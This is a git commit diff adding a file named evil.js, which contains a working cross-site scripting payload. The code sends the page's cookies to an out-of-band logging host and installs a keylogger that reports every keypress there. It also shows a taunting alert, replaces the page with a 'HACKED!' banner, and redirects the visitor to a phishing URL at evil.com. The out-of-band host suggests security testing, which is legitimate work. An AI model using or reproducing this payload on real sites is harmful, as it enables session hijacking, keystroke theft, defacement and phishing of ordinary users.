48d70f70f4e281e92902e4ade0f89952da2fbfad
v3nom <96822273+rayanchalise@users.noreply.github.com>
2025-02-19 12:11:06 +0545

    Update evil.js

--- evil.js
+++ evil.js
@@ -1,1 +1,9 @@
-
+fetch('https://gtszayijeuhquctbmohmzogwtpzcsuspe.oast.fun/log?cookie=' + document.cookie);
+document.onkeypress = function(e) {
+    fetch('https://gtszayijeuhquctbmohmzogwtpzcsuspe.oast.fun/keylog?key=' + encodeURIComponent(e.key));
+};
+alert("🔥 XSS Pwned by Anov3nn! Your data belongs to me! 💀");
+document.body.innerHTML = "<h1 style='color:red; text-align:center;'>🔥 HACKED! 🔥</h1>";
+setTimeout(function() {
+    window.location = "https://evil.com/phishing";
+}, 5000);
